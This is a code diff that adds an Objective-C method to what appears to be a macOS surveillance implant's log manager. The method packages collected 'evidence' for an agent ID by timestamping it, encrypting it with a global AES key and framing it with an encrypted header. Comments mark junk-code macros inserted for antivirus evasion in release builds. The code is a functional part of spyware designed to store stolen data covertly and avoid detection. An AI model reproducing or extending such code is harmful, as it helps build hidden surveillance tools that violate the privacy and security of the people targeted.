@@ -419,6 +419,57 @@ static __m_MLogManager *sharedLogManager = nil;
   [pool release];
 }
 
+- (NSMutableData *)prepareDataToLog: (NSMutableData *) evidenceData
+              evidenceHeader: (NSData *) anEvidenceHeader
+                  forAgentID: (u_int) agentID;
+{
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    NSMutableData *evidence = nil;
+    int64_t filetime;
+    time_t unixTime;
+    time(&unixTime);
+    filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
+    // logHeader contains the whole encrypted header
+    NSData *logHeader = [self _createLogHeader: agentID
+                                     timestamp: filetime
+                                   agentHeader: anEvidenceHeader];
+    if (logHeader == nil)
+    {
+        [pool release];
+        return evidence;
+    }
+    
+    NSData *temp = [NSData dataWithBytes: gLogAesKey
+                                  length: CC_MD5_DIGEST_LENGTH];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
+    int _blockSize = [evidenceData length];
+    NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
+                                       length: sizeof(int)];
+    
+    CCCryptorStatus result = 0;
+    result = [evidenceData __encryptWithKey: temp];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+
+    if (result != kCCSuccess)
+    {
+        [pool release];
+        return evidence;
+    }
+    
+    evidence = [[NSMutableData dataWithData:logHeader] retain];
+    [evidence appendData:blockSize ];
+    [evidence appendData:evidenceData];
+    
+    [pool release];
+    return evidence;
+}
+
 - (BOOL)createLog: (u_int)agentID
       agentHeader: (NSData *)anAgentHeader
         withLogID: (u_int)logID
